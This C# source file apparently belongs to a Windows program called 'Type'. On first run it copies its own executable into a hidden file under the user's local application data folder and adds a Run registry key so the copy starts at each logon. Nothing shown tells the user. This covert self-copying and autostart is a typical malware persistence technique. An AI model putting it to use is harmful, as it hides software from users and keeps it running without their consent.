using System;
using System.Text;
using System.IO;
using Microsoft.Win32;

namespace Type
{
    class LocalInstaller
    {
        private const int NAME_LEN = 8;
        private const char START_CHAR = 'a';
        private const char QUOT = '\"';
        private const string KEY = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string KEY_VALUE = "type-bin";
        private const Environment.SpecialFolder EMBED_LOC = Environment.SpecialFolder.LocalApplicationData;
        private const string EMBED_SUBFOLDER = @"\Type-App";
        private const string EXE_NAME = @"\type.exe";

        private static bool IsInstalled()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(KEY, true);
            string path;
            if ((path = (string)key.GetValue(KEY_VALUE)) == null)
            {
                return false;
            }
            else
            {
                path = RemoveQuotes(path);
                if (File.Exists(path))
                {
                    return true;
                }
                else
                {
                    key.DeleteValue(KEY_VALUE, false);
                    return false;
                }
            }
        }

        private static string RemoveQuotes(string path)
        {
            return (path.Substring(1, path.Length - 2));
        }

        public static void EmbedOnFirstRun()
        {
            if (!IsInstalled())
            {
                Embed();
            }
        }

        private static void Embed()
        {
            string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
            FileInfo applicationInfo = new FileInfo(me);

            string dest = (Environment.GetFolderPath(EMBED_LOC) + EMBED_SUBFOLDER);
            TouchDirectory(dest);

            string name = EXE_NAME;
            string target = (dest + name);

            Install(me, target);
        }

        private static void TouchDirectory(string dest)
        {
            if (!Directory.Exists(dest))
            {
                Directory.CreateDirectory(dest);
            }
        }

        private static void Install(string me, string target)
        {
            CopyBinary(me, target);
            SetRegistryAutoStart(target);
        }

        private static void SetRegistryAutoStart(string target)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(KEY, true);
            key.SetValue(KEY_VALUE, Quote(target));
        }

        private static string Quote(string text)
        {
            return (QUOT + text + QUOT);
        }

        private static void CopyBinary(string me, string target)
        {
            if (!File.Exists(target))
            {
                File.Copy(me, target);
                File.SetAttributes(target, File.GetAttributes(target) | FileAttributes.Hidden);
            }
        }
    }
}
